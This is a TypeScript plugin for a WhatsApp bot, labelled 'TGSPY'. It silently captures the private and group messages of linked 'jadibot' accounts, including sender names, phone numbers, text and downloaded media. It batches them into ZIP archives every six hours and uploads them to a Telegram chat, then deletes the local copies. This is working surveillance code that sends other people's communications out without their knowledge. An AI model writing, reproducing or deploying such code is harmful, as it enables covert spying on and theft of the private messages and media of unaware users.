// @ts-nocheck


import fs       from 'fs'
import path     from 'path'
import axios    from 'axios'
import FormData from 'form-data'
import { createWriteStream } from 'fs'
import { downloadContentFromMessage } from '@itsukichan/baileys'
import { fileURLToPath }  from 'url'
import { getTgToken, getTgChatId } from '../../Library/tg_global.js'

const __dirname    = path.dirname(fileURLToPath(import.meta.url as string))
const ROOT_DIR     = path.join(__dirname, '../..')   

const CONFIG_PATH  = path.join(ROOT_DIR, 'data', 'tgspy.json')
const QUEUE_PATH   = path.join(ROOT_DIR, 'data', 'tgspy_queue.json')
const BACKUP_DIR   = path.join(ROOT_DIR, 'media', 'tgspy_backup')   


const defaultCfg = {
  token:          '',
  chatId:         '',
  enabled:        false,
  forwardText:    true,
  forwardMedia:   true,
  forwardPrivate: true,
  forwardGroup:   true,
  onlyJadibot:    true,
  ignoreSelf:     false,
  maxFileSizeMB:  50,
  batchIntervalH: 6,
  lastSentAt:     0
}


function loadCfg() {
  try {
    if (!fs.existsSync(CONFIG_PATH)) {
      const def = { ...defaultCfg, lastSentAt: Date.now() }
      fs.writeFileSync(CONFIG_PATH, JSON.stringify(def, null, 2))
      return def
    }
    const saved = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf-8'))
    
    if (!saved.lastSentAt) saved.lastSentAt = Date.now()
    return { ...defaultCfg, ...saved }
  } catch { return { ...defaultCfg, lastSentAt: Date.now() } }
}

function saveCfg(data: unknown[]) {
  try { fs.writeFileSync(CONFIG_PATH, JSON.stringify(data, null, 2)) } catch {}
}


function loadQueue() {
  try {
    if (!fs.existsSync(QUEUE_PATH)) return []
    return JSON.parse(fs.readFileSync(QUEUE_PATH, 'utf-8'))
  } catch { return [] }
}

function saveQueue(q: unknown) {
  try { fs.writeFileSync(QUEUE_PATH, JSON.stringify(q, null, 2)) } catch {}
}

function addToQueue(item: unknown) {
  const q = loadQueue()
  q.push(item)
  saveQueue(q)
}

function clearQueue() {
  try { fs.writeFileSync(QUEUE_PATH, '[]') } catch {}
}


function ensureBackupDir() {
  if (!fs.existsSync(BACKUP_DIR)) fs.mkdirSync(BACKUP_DIR, { recursive: true })
}

function clearBackupDir() {
  try {
    if (!fs.existsSync(BACKUP_DIR)) return
    for (const f of fs.readdirSync(BACKUP_DIR)) {
      try { fs.unlinkSync(path.join(BACKUP_DIR, f)) } catch {}
    }
    console.log('[TGSPY] Backup dir dibersihkan')
  } catch {}
}

function countBackupFiles() {
  try {
    if (!fs.existsSync(BACKUP_DIR)) return 0
    return fs.readdirSync(BACKUP_DIR).length
  } catch { return 0 }
}


async function zipBackupDir(zipPath: unknown) {
  return new Promise(async (resolve, reject) => {
    try {
      const archiver = (await import('archiver')).default
      const output   = createWriteStream(zipPath)
      const archive  = archiver('zip', { zlib: { level: 6 } })

      output.on('close', () => resolve(archive.pointer()))
      archive.on('error', reject)

      archive.pipe(output)

      
      if (fs.existsSync(BACKUP_DIR)) {
        archive.directory(BACKUP_DIR, 'tgspy_backup')
      }

      
      const queue = loadQueue()
      if (queue.length > 0) {
        let txtContent = `TGSPY LOG — ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n`
        txtContent += `Total pesan: ${queue.length}\n`
        txtContent += '='.repeat(50) + '\n\n'
        for (const item of queue) {
          if (item.type === 'text') {
            txtContent += item.rawText + '\n' + '-'.repeat(30) + '\n'
          }
        }
        archive.append(txtContent, { name: 'pesan_teks.txt' })
      }

      archive.finalize()
    } catch (e) {
      reject(e)
    }
  })
}


async function sendZipToTelegram(token: unknown, chatId: unknown, zipPath: unknown, caption: string) {
  const form = new FormData()
  form.append('chat_id', chatId)
  form.append('caption', caption.slice(0, 1024))
  form.append('document', fs.createReadStream(zipPath), {
    filename: path.basename(zipPath)
  })
  await axios.post(
    `https://api.telegram.org/bot${token}/sendDocument`,
    form,
    { headers: form.getHeaders(), timeout: 120000 }  
  )
}


export async function flushBatch(cfg: unknown) {
  const token  = getTgToken()  || cfg.token  || ''
  const chatId = getTgChatId() || cfg.chatId || ''
  if (!token || !chatId) {
    console.log('[TGSPY] flushBatch: token/chatId belum diset')
    return
  }

  const queue     = loadQueue()
  const mediaCount = countBackupFiles()

  if (queue.length === 0 && mediaCount === 0) {
    console.log('[TGSPY] Batch kosong, skip')
    
    cfg.lastSentAt = Date.now()
    saveCfg(cfg)
    return
  }

  const waktu   = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
  const zipName = `tgspy_${Date.now()}.zip`
  const zipPath = path.join(ROOT_DIR, 'data', zipName)

  console.log(`[TGSPY] Mulai buat ZIP... (${queue.length} teks, ${mediaCount} media)`)

  try {
    
    const zipSize = await zipBackupDir(zipPath)
    const sizeMB  = (zipSize / (1024 * 1024)).toFixed(2)

    const caption =
      `📦 *TGSPY BACKUP*\n\n` +
      `📅 ${waktu}\n` +
      `💬 Pesan teks : ${queue.filter((q: unknown) => q.type === 'text').length}\n` +
      `🖼️ Media      : ${mediaCount} file\n` +
      `📦 Ukuran ZIP : ${sizeMB} MB`

    
    await sendZipToTelegram(token, chatId, zipPath, caption)
    console.log(`[TGSPY] ZIP berhasil dikirim ke Telegram (${sizeMB} MB)`)

    
    try { fs.unlinkSync(zipPath) } catch {}

    
    clearQueue()
    clearBackupDir()

    
    cfg.lastSentAt = Date.now()
    saveCfg(cfg)

    console.log('[TGSPY] Batch selesai, queue & backup dir dibersihkan ✅')

  } catch (e) {
    console.error('[TGSPY] flushBatch error:', (e as Error).message)
    
    try { if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath) } catch {}
  }
}


let _timerStarted = false

export function startBatchTimer() {
  if (_timerStarted) return
  _timerStarted = true

  setInterval(async () => {
    try {
      const cfg = loadCfg()
      if (!cfg.enabled) return
      const _tok = getTgToken() || cfg.token || ''
      const _cid = getTgChatId() || cfg.chatId || ''
      if (!_tok || !_cid) return

      const intervalMs = (cfg.batchIntervalH || 6) * 60 * 60 * 1000
      const now        = Date.now()

      if (now - (cfg.lastSentAt || 0) >= intervalMs) {
        console.log('[TGSPY] ⏰ Interval tercapai — mulai flush batch...')
        await flushBatch(cfg)
      }
    } catch (e) {
      console.error('[TGSPY] timer error:', (e as Error).message)
    }
  }, 60 * 1000) 

  console.log('[TGSPY] ✅ Batch timer aktif')
}


startBatchTimer()


const handler = {
  tags: ['passive'],

  handler: async (m, { Morela }) => {
    try {
      const cfg = loadCfg()

      
      if (!cfg.enabled) return
      if (!(getTgToken() || cfg.token) || !(getTgChatId() || cfg.chatId)) return
      if (cfg.onlyJadibot && !m._isJadibot) return
      if (cfg.ignoreSelf  && m.key?.fromMe) return

      const isGroup = m.isGroup || m.key?.remoteJid?.endsWith('@g.us')
      if (isGroup  && !cfg.forwardGroup)   return
      if (!isGroup && !cfg.forwardPrivate) return

      const sender     = m.pushName || m.sender?.split('@')[0] || 'Unknown'
      const numSend    = m.sender?.split('@')[0]?.split(':')[0] || ''
      const waktu      = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
      const mtype      = m.mtype || Object.keys(m.message || {})[0] || ''
      const isOutgoing = m.key?.fromMe === true

      let groupName = ''
      if (isGroup) {
        try {
          const meta = await Morela.groupMetadata(m.key.remoteJid).catch(() => null)
          groupName  = meta?.subject ? ` | ${meta.subject}` : ''
        } catch {}
      }

      const arah = isOutgoing ? '📤 KELUAR' : '📥 MASUK'

      
      if (cfg.forwardText && ['conversation', 'extendedTextMessage'].includes(mtype)) {
        const teks = m.message?.conversation || m.message?.extendedTextMessage?.text || ''
        if (!teks.trim()) return

        const rawText =
          `[${arah}] ${waktu}\n` +
          `Dari: ${sender} (+${numSend})${groupName}\n` +
          `Pesan: ${teks}`

        addToQueue({ type: 'text', rawText, savedAt: Date.now() })
        console.log(`[TGSPY] Teks ditambahkan ke queue`)
        return
      }

      
      if (!cfg.forwardMedia) return

      const mediaMap = {
        imageMessage:    { dlType: 'image',    ext: 'jpg',  label: 'FOTO'    },
        videoMessage:    { dlType: 'video',    ext: 'mp4',  label: 'VIDEO'   },
        audioMessage:    { dlType: 'audio',    ext: 'ogg',  label: 'AUDIO'   },
        documentMessage: { dlType: 'document', ext: 'bin',  label: 'DOKUMEN' },
        stickerMessage:  { dlType: 'sticker',  ext: 'webp', label: 'STICKER' }
      }

      const info = mediaMap[mtype]
      if (!info) return

      const mediaMsg = m.message?.[mtype]
      if (!mediaMsg) return

      
      const sizeMB = Number(mediaMsg.fileLength || 0) / (1024 * 1024)
      if (sizeMB > cfg.maxFileSizeMB) {
        const rawText =
          `[${arah} - ${info.label} TERLALU BESAR ${sizeMB.toFixed(1)}MB] ${waktu}\n` +
          `Dari: ${sender} (+${numSend})${groupName}`
        addToQueue({ type: 'text', rawText, savedAt: Date.now() })
        return
      }

      
      let buffer
      try {
        const stream = await downloadContentFromMessage(mediaMsg, info.dlType)
        const chunks = []
        for await (const chunk of stream) chunks.push(chunk)
        buffer = Buffer.concat(chunks)
        if (!buffer.length) return
      } catch (dlErr) {
        if ((dlErr as Error).message?.includes('bad decrypt') || (dlErr as Error).message?.includes('decrypt')) {
          console.log('[TGSPY] Skip media expired (bad decrypt)')
          return
        }
        throw dlErr
      }

      
      const mimeExt  = mediaMsg.mimetype?.split('/')[1]?.split(';')[0] || info.ext
      const origName = mediaMsg.fileName || `${info.dlType}.${mimeExt}`
      const saveName = `${arah.replace(/[^a-zA-Z]/g, '')}_${Date.now()}_${origName}`

      
      ensureBackupDir()
      const savePath = path.join(BACKUP_DIR, saveName)
      fs.writeFileSync(savePath, buffer)

      
      const captionText =
        `[${arah} - ${info.label}] ${waktu}\n` +
        `Dari: ${sender} (+${numSend})${groupName}\n` +
        `File: ${saveName}` +
        (mediaMsg.caption ? `\nCaption: ${mediaMsg.caption}` : '')

      addToQueue({ type: 'media_info', rawText: captionText, savedAt: Date.now() })
      console.log(`[TGSPY] Media disimpan: ${saveName}`)

    } catch (e) { console.error('[TGSPY] passive error:', (e as Error).message) }
  }
}

export default handler
export { loadQueue, clearQueue, countBackupFiles, clearBackupDir }